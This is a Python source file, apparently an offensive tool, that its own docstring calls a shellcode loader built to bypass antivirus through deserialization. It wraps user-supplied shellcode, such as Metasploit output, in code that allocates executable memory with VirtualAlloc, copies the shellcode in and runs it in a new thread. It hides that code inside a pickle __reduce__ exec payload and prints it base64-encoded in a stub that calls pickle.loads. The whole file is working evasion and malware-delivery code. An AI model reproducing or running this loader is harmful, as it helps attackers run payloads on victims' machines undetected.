import pickle
import base64
import argparse

"""
通过反序列化加载shellcode，Bypass AV
"""

pycode = ""

def loader(code):
    global pycode
    pycode = """
shellcode = b"{}"
shellcode = escape_decode(shellcode)[0]
shellcode = bytearray(shellcode)

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
 
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr), 
    buf, 
    ctypes.c_int(len(shellcode))
)

handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), 
    ctypes.c_int(0), 
    ctypes.c_uint64(ptr), 
    ctypes.c_int(0), 
    ctypes.c_int(0), 
    ctypes.pointer(ctypes.c_int(0))
)

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
""".format(code)


# 做反序列化处理    
class A(object):
    global pycode
    def __reduce__(self):
        return(exec,(pycode,))


if __name__ == '__main__':

    parser = argparse.ArgumentParser(
        usage='pyloader -f payload.c',
        description="Python Shellcode Loader",
    )


    #parser.add_argument("-u", dest="url",
    #                    help="Specify shellcode url")
    parser.add_argument("-f", dest="file",
                        help="Specify shellcode file")
    parser.add_argument("-s", dest="shellcode",
                        help="Specify shellcode raw")
    parser.add_argument("-v", dest="verbose", action="store_true",
                        help="show verbose")

    args = parser.parse_args()

    if args.file is None and args.shellcode is None:
        parser.print_help()
        exit(1)

    if args.file:
        with open(args.file, 'r') as f:
            shellcode = f.read().rstrip()
            # msf shellcode
            shellcode = shellcode.replace('"', '').replace('\n', '')
            

    if args.shellcode:
        shellcode = args.shellcode

    loader(shellcode)

    # 输出原始代码
    if args.verbose:
        print(pycode)
        print("="*80)

    unserialize = pickle.dumps(A())
    unserialize_base64 = base64.b64encode(unserialize)

    result = """
import ctypes
import pickle
from base64 import b64decode
from codecs import escape_decode

a = {}

pickle.loads(b64decode(a))
""".format(unserialize_base64)

    print(result)

    


